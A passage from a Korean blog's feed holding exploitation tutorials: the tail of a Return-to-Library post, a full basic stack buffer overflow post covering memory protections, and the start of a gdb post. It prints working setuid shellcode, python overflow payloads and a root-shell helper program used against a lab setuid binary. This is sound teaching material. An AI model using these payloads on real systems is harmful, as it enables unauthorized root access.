&lt;p&gt;먼저 버버 크기(40byte)와 sfp(4byte) 를 채워 주고 공유 라이브러리에 위치한 system() 함수를 저장시킵니다. 다음 위치에는 AAAA의 4byte를 채워 줍니다. 이유는 위에서 알려 드렸듯 system()의 인자값은 8byte 뒤에 위치하기에 그 거리만큼 벌려 주고 우리가 필요로 하는 /bin/sh을 위치 시켜 줌으로서 system()이 인자값으로 /bin/sh을 정상적으로 받을수 있게 설계해준겁니다.&lt;/p&gt;

&lt;p&gt;설명은 이쯤 해두고 직접 떄려보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-8.png&quot; alt=&quot;[그림 4-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;shell이 떨어지네요. 지금 한 방식처럼 system() 내부의 /bin/sh 문자열을 찾는 방법도 있고 전 포스팅에서 했던 환경변수를 이용 하는 방법도 있습니다. 빠르게 보고 넘어가죠.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-9.png&quot; alt=&quot;[그림 4-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 설명 드렸듯 bof라는 환경변수에 /bin/sh 문자열을 저장하고 해당 환경변수의 주소를 확인합니다. 아래쪽은 bof 환경변수의 동작 여부를 확인 했습니다.&lt;/p&gt;

&lt;p&gt;system()의 주소는 알고 있으니 환경변수의 주소만 추가해서 바로 페이로드를 작성하고 떄려봅시다&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-10.png&quot; alt=&quot;[그림 4-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;shell은 마찬가지로 잘 떨어집니다만…우리가 원하는 root 권한이 아니라서 아쉽습니다…..ㅠ 아쉬움을 달래봅시다.&lt;/p&gt;

&lt;p&gt;우선 system()의 근본적인 문제를 알아 봅시다.&lt;/p&gt;

&lt;p&gt;system()의 경우 내부적으로 &lt;strong&gt;/bin/sh -c argument&lt;/strong&gt;를 실행합니다.
따라서 &lt;strong&gt;/bin/sh -c /bin/sh&lt;/strong&gt; 로 처리가 되며, root 권한을 얻는것은 system()의 내부에서 /bin/sh를 실행 후 다시 /bin/sh을 실행하기에 불가능합니다. 
따라서 &lt;strong&gt;setuid()&lt;/strong&gt;함수 를 0으로 셋팅해주고 system()가 실행되도록 하여 &lt;strong&gt;미리 실행전에 root 권한으로 준비시킨 후 system()을 실행&lt;/strong&gt;시킨다면 가능하며 system() 함수의 주소가 아닌 다른 함수가 필요한데 그것이 &lt;strong&gt;execl()&lt;/strong&gt;함수입니다.
먼저 setuid()를 셋팅해 줄 소스부터 작성 해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
02 
03 int main(){
04   setuid(0);
05 	 system(&quot;/bin/sh&quot;);
06   return 0;
07 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;해당 파일을 컴파일해주시고 마찬가지로 환경변수에 저장 해줍니다. execl()의 주소도 위에서 system() 주소값을 찾았던 방식으로 찾아주시면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-11.png&quot; alt=&quot;[그림 4-11]&quot; /&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;새로 작성한 &lt;strong&gt;/tmp/bof1/rootsh&lt;/strong&gt; 주소 = &lt;strong&gt;??&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 페이로드를 짜야 하는데 한가지 주의점은 execl()은 끝에 null로 끝나야 합니다.
execl(const char *path, const char *arg0, const char *arg1, const char *arg2,…const char *argn, (char *)0);의 형태로 구성 되있는데 조금더 보기 쉽게 하자면
execl(경로, 인자1, 인자2….인자n, null) 이라고 이해하시면 됩니다. 마지막은 인자의 끝을 의미로 null값이 위치하게 됩니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;execl주소&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;공격 페이로드는 위와 같이 구성 될것입니다.&lt;/p&gt;

&lt;p&gt;페이로드 전에 execl()을 사용하기 위해 메모리 상태를 봐야합니다. 이유는 끝이 null값으로 끝나는 적당한 지점을 골라야 하기 때문입니다. 직접 보는게 이해하기 빠를겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-12.png&quot; alt=&quot;[그림 4-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 그림과 같이 BBBB는 execl()의 주소가 되며(파란색) CCCC는 불필요한 값이며(초록색) DDDD가 새로 작성한 rootsh의 주소(노란색)가 됩니다. 위에서 execl()의 인자값의 형태를 봤습니다. 경로 + 인자1 + 인자2 +인자n + NULL의 형태를 띄우며 DDDD 하나는 경로에 들어가며 DDDD가 하나더 들어가면 인자 1에 들어갑니다. 그렇다는 것은 마지막이 마지막으로 DDDD의 뒤의 한 바이트는 NULL이 되어야 4바이트가 전부 NULL로 자리를 잡게 됩니다. 다음 그림과 위 그림의 하늘색 박스의 1byte값인 2c를 확인해보면 무슨 말인지 이해 되실거라 생각 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-13.png&quot; alt=&quot;[그림 4-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;상단에 입력한 페이로드를 보면 DDDD를 &lt;em&gt;2 했으며 아래쪽에 하늘색 박스가 2c가 아닌 00으로 바뀌었음을 확인 간으합니다. 즉 DDDD DDDD가 들어간 다음 1byte는 NULL로 바꾸게 됩니다. 이제 DDDD&lt;/em&gt;3을 입력하여 우리가 원하는 0xbffffe4a0(보라색)의 값이 바뀌는지 확인하도록 합시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-14.png&quot; alt=&quot;[그림 4-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;우리가 원하는 모양으로 메모리 값이 바뀌는걸 확인 했으니 페이로드를 다시 정리 해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; + &quot;rootsh 주소&quot;*3'`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이제 rootsh 의 주소를 알아내고 *3만 붙여주면 될 듯 합니다. 고지가 보이네요.&lt;/p&gt;

&lt;p&gt;위에서 작성하고 컴파일한 rootsh를 주소가 변하지않는 값을 찾아서 심볼릭 링크를 걸어줘야 합니다. 변하지 않는 곳은 Data segment 영역입니다.&lt;/p&gt;

&lt;p&gt;Data segment 영역의 주소는 0x08049000 부터 시작합니다. 해당 주소를 dbg를 이용해서 열어보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-15.png&quot; alt=&quot;[그림 4-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x08049014 주소의 값이 0x01(=0x00000001)을 갖고있습니다. 다른 값을 쓰셔도 됩니다만 입력에 있어서 편안한 간단한 값을 선택 합니다. 0x08049014 = 0x01 이라는것을 알아 두시면 됩니다. 이제 rootsh 코드와 0x01의 주소를 심볼릭 링크 시켜줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-16.png&quot; alt=&quot;[그림 4-16]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;자 이제 준비가 끝났습니다. 위에서 찾아본 내용을 바탕으로 페이로드를 재구성 해보겠습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;execl()&lt;/strong&gt; 주소 = &lt;strong&gt;0x420acaa0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/tmp/bof1/rootsh 심볼릭 링크 주소&lt;/strong&gt; = &lt;strong&gt;0x08049014&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;[AAAA(44byte)] + [execl() 주소] + [잉여값(4byte)] + [rootsh sl 주소] 과 구성되며 실제 공격 페이로드는 아래와 같습니다.(공격 페이로드는 root 권한의 파일을 대상으로 확인하셔야 합니다.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../bof/bof1 &quot;`python -c 'print &quot;AAAA&quot;*11 + &quot;\xa0\xca\x0a\x42&quot; + &quot;AAAA&quot; 
+ &quot;\x14\x90\x04\x08&quot;*3'`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이때 주의할 점은 페이로드 전체를 ““로 감싸야 합니다. \x0a를 \x00으로 인식하는 문제가 있어서 “&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print .......'&lt;/code&gt;” 이런식로 감싸주셔야 똑바로 값이 들어갑니다. 꼭 ““으로 감싸주세요!&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-17.png&quot; alt=&quot;[그림 4-17]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짜잔….개…root 권한으로 shell을 땄습니다. 
이번에도 역시나 간단하게 하고 싶었는데 고생도 하느라 이것저것 실수 했던것들 다 담느라 많이 길어졌네요…..ㅂㄷㅂㄷ….&lt;/p&gt;

&lt;p&gt;RTL이란 기법은 나중에 알아볼 ROP를 위한 초석입니다. 꼭 잘 숙지 해주셔야 합니다….. :(&lt;/p&gt;

&lt;p&gt;다음 포스팅은 Chaining RTL이란 것을 정말…간단히 볼 수 있도록 해보겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;뿅!&lt;/strong&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">RTL(Return to Library)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">linux_0x03</title>
      <link href="/linux_0x03" rel="alternate" type="text/html" title="linux_0x03" />
      <published>2019-03-11T19:18:00+09:00</published>
      <updated>2019-03-11T19:18:00+09:00</updated>
      <id>/linux_0x03</id>
      <content type="html" xml:base="/linux_0x03">&lt;h2 id=&quot;0x03---basic-bof--메모리-보호-기법&quot;&gt;0x03 - Basic BOF &amp;amp; 메모리 보호 기법&lt;/h2&gt;

&lt;p&gt;안녕하세요! &lt;strong&gt;Sulla&lt;/strong&gt;임돠….&lt;/p&gt;

&lt;p&gt;이번에는 저번 시간에 이어서 &lt;strong&gt;Basic BOF&lt;/strong&gt; 또는 &lt;strong&gt;Direct EIP overwrite&lt;/strong&gt; 라고 불리는 기본적인 BOF와 메모리 보호 기법에 대해서 알아 보겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;basic-bof-준비&quot;&gt;Basic BOF 준비&lt;/h1&gt;

&lt;p&gt;지난 시간에 &lt;strong&gt;RET&lt;/strong&gt;구역 즉, EIP 값이 저장되는 구역에 “&lt;strong&gt;HACK&lt;/strong&gt; “ 저장됨을 확인했습니다. 이 말은 공격자가 RET 구역에 원래 있어야 할 값을 임의의 값으로 변경이 가능 하다는 말이죠.  초기에 레지스터의 역할을 간략히 설명 드릴때 &lt;strong&gt;EIP&lt;/strong&gt; 레지스터의 역할은 “&lt;strong&gt;다음 명령의 주소를 가리킨다”&lt;/strong&gt;라고 했었죠. 이것을 노려서 공격자는 &lt;strong&gt;EIP&lt;/strong&gt;에 원하는 주소값을 저장해 공격을 이어갑니다. 명령어가 종료 된 후 &lt;strong&gt;EIP&lt;/strong&gt; 주소를 참조해 공격자가 미리 지정한 주소로 이동하여 명령을 이어가죠. 이 때 공격자는 shell을 따 내는것이 최종 목표입니다. 물론 굳이 shell 아니더라도 원하는 행위만 미리 구현해 둔다면 실행이 될 것 입니다.&lt;/p&gt;

&lt;p&gt;말이 주절주절 길어졌는데 간략한 그림으로 표현 해보죠.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-1.png&quot; alt=&quot;[그림 3-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지난 포스팅에서 다룬 내용과 비슷합니다. &lt;strong&gt;함수 프롤로그&lt;/strong&gt; 과정이 지난 후에 버퍼 크기만큼 공간을 확보 후 함수가 진행되고 함수 종료후 &lt;strong&gt;ret&lt;/strong&gt; 구역에 저장되있는 주소를 참조하여 이동 합니다. 위 그림과 같이 &lt;strong&gt;Shellcode&lt;/strong&gt;가 저장되있는 임의의 주소가 될 것이며 해당 주소 이동 후 &lt;strong&gt;Shellcode&lt;/strong&gt;가 실행 되어 공격자가 원하는 행위를 하게 되는 것이죠!!&lt;/p&gt;

&lt;p&gt;그런데, Shellcode, Shellcode, 쉘코드 하는데 이게 뭐하는 놈일까요? 명칭의 기원은 모르나 역할만은 분명합니다. 이름 그대로 shell을 따내는 code이죠. 위에서도 계속 말했듯이 공격자가 원하는 행위를 수행하도록 하는게 목표라고 했죠. 파일을 생성하든, 삭제하든 passwd, shadow 및 각종 config 파일 과 같은 중요 파일을 대상으로 뭔가를 행위를 하도록 하면 됩니다. 단지 이 모든걸 한방에 할 수 있는건 shell을 따냄으로서 해결됩니다. 물론 권한 문제가 필요하기에 root권한이 필요할겁니다. 쉽게 표현 하자면 감기약, 두통약, 치통약, 변비약 등등 이것저것 챙겨 먹을 필요없이 만병통치약 하나 먹으면 된다는 것이죠. &lt;strong&gt;shellcode&lt;/strong&gt;는 이미 인터넷에 다양하게 생성되있습니다. 해당 코드를 따와서 사용해도 되고, 직접 만들어서 사용해도 됩니다. &lt;strong&gt;shellcode&lt;/strong&gt; 작성 방법에 대해서는 나중에 따로 다뤄보도록 하곘습니다.&lt;/p&gt;

&lt;p&gt;그럼 &lt;strong&gt;Shellcode&lt;/strong&gt;가 뭔지는 알았으니 이놈을 써서 직접 BOF를 해봐야 하는데 문제가 하나 있습니다. 지금까지 설명한 내용처럼 사용자가 메모리의 주소를 알고 있는 상태 즉, 메모리의 주소값이 고정값이라면 공격이 쉬워 지기에 이를 방어하기 위해서 메모리의 주소값을 랜덤으로 부여 합니다.(&lt;strong&gt;ASLR&lt;/strong&gt;) 다음 사진을 보시죠.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-2.png&quot; alt=&quot;[그림 3-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;붉은 박스에서 보여지듯 ESP의 메모리 주소는 계속 바뀝니다.(사실 잘 보시면 완전 랜덤화는 아닙니다….끝에만 바뀌고 있죠…) 즉, 프로그램이 시작 될 때마다 할당받는 메모리의 주소값이 바뀌는 것이죠. 그럼 어찌 해야 할까요?? 가장 간단한 방법은 메모리의 주소가 안바뀐다면?? 메모리의 주소가 항상 고정된 주소를 사용하는 뭔가가 있지 않을까??라는 생각을 하게됩니다. 그런게 뭐가 있을까요?? 고정된 메모리 주소값을 가지며  쉽게 다룰 수 있는???&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;황경변수&lt;/strong&gt;는 항상 고정된 메모리 주소값을 가집니다.&lt;/p&gt;

&lt;h1 id=&quot;환경변수&quot;&gt;환경변수&lt;/h1&gt;

&lt;p&gt;환경변수의 역할은 OS가 필요한 정보들을 미리 메모리에 등록해서 필요할떄 바로바로 해당 내용들을 참조합니다. python, java 또는 서버 구축 후에 환경변수를 등록해서 쉽게 구동시키는 작업을 생각한다면 이해가 되실겁니다.(실행경로를 환경 변수 등록하는 과정….JAVA_HOME이 대표적이죠.)&lt;/p&gt;

&lt;p&gt;미리 등록해서 번거롭게 설치된 위치로 이동해서 실행한는 것이 아니라 간편하게 바로바로 실행할 수 있도록 경로를 환경변수로 등록 하는것이죠. 자연스럽게 아셨겠지만 이 환경변수는 사용자가 직접 등록해서 사용할 수 있다는것도 아실겁니다. 미리 운영체제에 필요한 내용들이 등록되있고 사용자의 필요로 인한 내용을 등록해서 사용도 가능하죠.&lt;/p&gt;

&lt;p&gt;그렇다면 환경변수의 주소를 어떻게 알 수 있을까요? 다음과 같은 코드를 작성해서 우리가 원하는 환경변수의 주소값을 출력 가능합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-3.png&quot; alt=&quot;[그림 3-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;코드는 간단합니다. argv[]로 입력받은 값을 addr에 저장 합니다. 이떄 addr은 char형트로 포인터가 붙어있어서 주소값 형태로 저장 됩니다.
위 코드를 작성 하고 해당 프로그램을 실행하면 다음과 입력한 환경변수의 주소값을 출력해줍니다. 또한 환경변수의 주소값이 변하지 않는다는것 또한 확인 가능합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-4.png&quot; alt=&quot;[그림 3-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;거의 다 되갑니다…. 이제 공격의 환경을 만들어 볼까 합니다. 우리는 shell을 따내는것이 목표이지만 더 정확히 말하자면 &lt;strong&gt;root 권한&lt;/strong&gt;을 얻는것이 목표입니다. shell을 따도 &lt;strong&gt;root 권한&lt;/strong&gt;이 없을경우 제한적인 권한을 가지게 되죠. 그런데 &lt;strong&gt;setuid&lt;/strong&gt;가 설정 되어있는 경우 이런 문제가 해결 됩니다. 이유는 &lt;strong&gt;setuid&lt;/strong&gt;가 설정된 파일을 실행하는 동안은 해당 파일의 소유권자와 동일한 권한을 부여 받습니다. root 계정이 a파일을 &lt;strong&gt;setuid&lt;/strong&gt; 권한으로 설정헀다면 일반 계정이 해당 파일을 실행하는 동안은 &lt;strong&gt;root 권한&lt;/strong&gt;을 부여 받는것이죠. 실제로 root권한을 부여 받는지 확인을 위해 일반 계정으로 변경 해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-5.png&quot; alt=&quot;[그림 3-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;추가로 언어팩도 아래와 같이 변경해 줍니다. 이떄 계정은 일반 계정으로 변경하고 진행 해줍니다. 기본 셋팅은 UTF-8로 설정되어 있는데 영어의 경우 한 글자 당 1바이트를 사용합니다. 추후에 쉘코드 입력시 값이 1바이트를 넘는다면 의도된 값으로 입력되지 않기 때문에 2바이트를 사용하는 한글로 변경 해야하죠. (ASCII (7bit 인식)와 UNICODE(8bit 인식)의 인식 차이입니다.)&lt;/p&gt;

&lt;p&gt;쉽게 말해 공격수행에 문제가 생기기 때문에 바꿔주는 것입니다. 환경변수를 바꾸는 방법은 &lt;strong&gt;export&lt;/strong&gt; 명령어를 사용하며 아래와 같이 진행됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-6.png&quot; alt=&quot;[그림 3-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금부터는 일반계정(sulla)으로 변경하여 진행 합니다. 환경은 준비가 끝났고 이제 본격적으로 일반계정으로 BOF를 시도하여 root 권한의 shell을 따보도록 합시다.&lt;/p&gt;

&lt;h1 id=&quot;basic-bof-진짜-시작&quot;&gt;Basic BOF 진짜 시작&lt;/h1&gt;

&lt;p&gt;시작 전에 정리하자면 아래와 같습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;고정된 메모리 주소를 사용하는 환경변수를 이용해 &lt;strong&gt;shellcode&lt;/strong&gt;를 환경변수에 저장하고 해당 황경변수의 주소를 알아냅니다.&lt;/li&gt;
  &lt;li&gt;쉘코드가 저장된 환경변수의 메모리 주소를 취약한 bof1 파일에 삽입합니다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;즉, 공격 페이로드는 이런 모습으로 구성될 것 입니다 [&lt;strong&gt;44byte 잉여값&lt;/strong&gt;] + [&lt;strong&gt;4byte 환경변수 주소&lt;/strong&gt;]&lt;/p&gt;

&lt;p&gt;그럼 1번 과정 부터 먼저 해보도록 합시다.&lt;/p&gt;

&lt;p&gt;환경변수를 설정해야 하니 &lt;strong&gt;export&lt;/strong&gt; 명령어를 사용해서 환경변수 명과 내용을 채워보도록 하죠. 공격용 쉘코드는 다음과 같습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\xeb\x0f\x5e\x31\xc0\x50\x89\xe2\x56\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 길다란 코드를 아래와 같이 환경변수로 저장하고 주소까지 확인해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-7.png&quot; alt=&quot;[그림 3-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;bof라는 이름으로 환경변수를 만들었습니다. 환경변수 내용은 /bin/sh 를 실행하는 내용이며 해당 환경변수의 주소를 확인하니 &lt;strong&gt;0xbffffee9&lt;/strong&gt;의 주소값을 가지고 있습니다. 이로써 1번 과정을 끝났습니다. 이제 2번 과정을 진행해 봅시다. 그림으로 표현하자면 아래와 같이 보여지겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-8.png&quot; alt=&quot;[그림 3-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;공격 페이로드는 저번 시간에서 작성했던 방식과 동일합니다.&lt;/p&gt;

&lt;p&gt;단, 지난 시간에서는 버퍼 영역에 “&lt;strong&gt;A&lt;/strong&gt;” 40byte와 sfp 영역에 “&lt;strong&gt;B&lt;/strong&gt;” 4byte  마지막으로 ret 영역에 “&lt;strong&gt;HACK&lt;/strong&gt;“를 저장 헀습니다. 즉, 잉여 데이터 44byte를 입력했고 ret에 원하는 4byte를 입력하는 과정이었습니다.&lt;/p&gt;

&lt;p&gt;지금부터는 “&lt;strong&gt;HACK&lt;/strong&gt;“이 아닌 위에서 알아낸 &lt;strong&gt;환경변수의 주소값&lt;/strong&gt;을 입력 할것입니다. 물론 sfp 영역의 “B” 또한 잉여 데이터기에 “A”로 통일해서 입력 합니다.(그동안은 각 영역을 구분하기 위해 A B HACK 로 나눠서 입력했습니다…..) 주의점은 환경변수의 주소값은 &lt;strong&gt;리틀엔디안&lt;/strong&gt; 형식으로 입력해 줍니다. 그럼 아래와 같이 공격 페이로드가 완성 됩니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;A&quot;*11 + &quot;\xe9\xfe\xff\xbf&quot;'`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;작성된 페이로드를 입력 하게 되면 아래와 같이 shell이 떨어지며 가장 중요한 점은 shell의 &lt;strong&gt;uid&lt;/strong&gt;권한이 &lt;strong&gt;root&lt;/strong&gt;권한임을 확인할 수 있습니다!!!!&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x03/0x03-9.png&quot; alt=&quot;[그림 3-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이렇게해서 드디어 root권한의 shell을 따내는데 성공 헀습니다. 앞에서 설정헀던 &lt;strong&gt;setuid&lt;/strong&gt;를 해체한 상태로 진행하면 &lt;strong&gt;uid&lt;/strong&gt;가 &lt;strong&gt;root&lt;/strong&gt;가 아닌 일반 계정(sulla)으로 설정 됨을 확인하실 수 있습니다.&lt;/p&gt;

&lt;h1 id=&quot;메모리-보호-기법&quot;&gt;메모리 보호 기법&lt;/h1&gt;

&lt;p&gt;위에서 말헀던 메모리의 주소를 랜덤화 하는 메모리 보호기법을 &lt;strong&gt;ASLR(Address Space Layout Randomization)&lt;/strong&gt; 이라고 부릅니다. &lt;strong&gt;ASLR&lt;/strong&gt; 외의 다양한 보호 기법이 있는데 알아보도록 하죠.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ASLR :&lt;/strong&gt; 프로세스가 실행될 떄마다 메모리의 주소를 랜덤화 합니다.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DEP/NX bit :&lt;/strong&gt; Stack/Heap등 메모리 영역에 실행 권한을 없애 코드 실행을 막습니다.( 쉽게 말해 Stack/heap 영역에 저장된 Shellcode의 실행을 막는다는 겁니다.)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CANARY :&lt;/strong&gt; 메모리에 무결성 확인을 위해 버퍼 영역과 SFP 영역 사이에 특정한 값을 설정 합니다. (네트워크의 패킷 무결성을 위한 패리티 비트와 비슷한 역할이라 생각하면 편합니다.)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ASCII-Armor :&lt;/strong&gt; 공유 라이브러리 영역 상위에 NULL값을 삽입하여 호출을 막습니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이외에도 더 있습니다. 이러한 메모리 보호 기법이 하나, 둘 적용 되면서 우회기법이 생기고 묻히고 생기고 묻히길 반복합니다. 다들 아시겠지만 많이 보이던 패턴이죠. 
(취약점 &amp;gt; 대응 &amp;gt; 우회 &amp;gt; 대응 &amp;gt;우회 &amp;gt; 대응 &amp;gt; 우회 &amp;gt; 대응 &amp;gt; 우회 &amp;gt; 대응) * 무한 반복&lt;/p&gt;

&lt;p&gt;앞으로는 Basic BOF를 중심으로 어떤 보호기법이 생겼고 그 우회 방법은 어떤것이 있는지 또 그 우회 방법의 어떤 대응법이 있고 또 다시 대응법의 새로운 우회ㅂ…..후……&lt;/p&gt;

&lt;p&gt;천천히 오늘 했던 방식처럼 하나 하나씩 알아보도록 하겠습니다.
고생하셨습니다. 다음 포스팅까지 차근차근 준비해서 다시 뵙겠습니다.&lt;/p&gt;

&lt;p&gt;감사합니다!
&lt;strong&gt;뿅&lt;/strong&gt;!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x03 - Basic BOF &amp;amp; 메모리 보호 기법</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">linux_0x02</title>
      <link href="/linux_0x02" rel="alternate" type="text/html" title="linux_0x02" />
      <published>2019-02-22T19:18:00+09:00</published>
      <updated>2019-02-22T19:18:00+09:00</updated>
      <id>/linux_0x02</id>
      <content type="html" xml:base="/linux_0x02">&lt;h2 id=&quot;0x02---buffer-overflow-맛보기&quot;&gt;0x02 - Buffer Overflow 맛보기&lt;/h2&gt;

&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;임돠.&lt;/p&gt;

&lt;p&gt;오늘은 저번 시간에 다룬 내용에 이어서 기본적인 BOF 와 추가적으로 알아야 할 내용을 다루도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;먼저 이번 시간부터는 직접 &lt;strong&gt;gdb&lt;/strong&gt;를 이용해서 여기저기 들쑤실 계획인데 그럴려면 &lt;strong&gt;gdb&lt;/strong&gt; 조작법을 먼저 알아야 겠죠. 마찬가지로 필요한 명령어들 먼저 알아 보도록 하겠습니다. (개취)&lt;/p&gt;

&lt;h1 id=&quot;gdb&quot;&gt;gdb&lt;/h1&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-1.png&quot; alt=&quot;[그림 2-1]&quot; /&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-2.png&quot; alt=&quot;[그림 2-2]&quot; /&gt;
&lt;/figure&gt;

